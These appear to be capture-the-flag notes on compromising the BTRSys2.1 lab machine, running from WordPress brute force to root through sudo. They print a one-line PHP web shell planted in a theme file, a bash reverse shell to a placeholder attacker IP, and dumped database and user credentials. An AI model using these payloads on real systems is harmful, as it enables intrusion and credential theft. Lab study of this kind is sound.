# BTRSys2.1: Machine Notes

## Recon

### Nmap
- Port 21/tcp: FTP (Anonymous login allowed)
- Port 22/tcp: SSH
- Port 80/tcp: HTTP (Apache 2.4.18)

### Web Enumeration
- `robots.txt` reveals `/wordpress/`.
- `wpscan` identifies users: `admin`, `btrisk`.
- Brute force `admin` on WordPress: `admin` : `admin`.

## Initial Access

### WordPress RCE
- Logged in as `admin`.
- Modified `Appearance -> Editor -> twentyfourteen -> 404.php`:
```php
<?php system($_GET['cmd']); ?>
```
- Gained RCE: `http://[IP]/wordpress/wp-content/themes/twentyfourteen/404.php?cmd=id`.
- Rev shell:
```bash
bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'
```

### Post-Exploitation
- Found DB credentials in `wp-config.php`:
  - `DB_USER` : `root`
  - `DB_PASSWORD` : `rootpassword!`
- Accessed MySQL and dumped `wp_users`:
  - `btrisk` : `a318e4507e5a74604aafb45e4741edd3` (MD5 -> `roottoor`).

## Privilege Escalation

### Sudo Abuse
- Logged in via SSH/su as `btrisk` : `roottoor`.
- `sudo -l` shows:
```
(ALL : ALL) ALL
```
- Execute `sudo su`.
- Result: **Root shell**.
